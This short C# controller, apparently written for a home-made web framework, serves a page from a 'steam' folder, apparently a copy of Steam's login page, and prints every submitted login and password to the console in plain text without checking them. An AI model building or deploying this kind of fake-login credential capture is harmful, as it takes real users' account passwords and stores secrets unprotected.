using Server.Framework.Attributes;

namespace Server.Controllers
{
    [HttpController("auth")]
    public class AuthController
    {
        [Get("login")]
        public string Login()
        {
            return "steam/index.html";
        }

        [Post("login")]
        public string Login([FormData] string login, [FormData] string password)
        {
            Console.WriteLine($"Логин: {login}; Пароль: {password}");
            return "steam/index.html";
        }

    }
}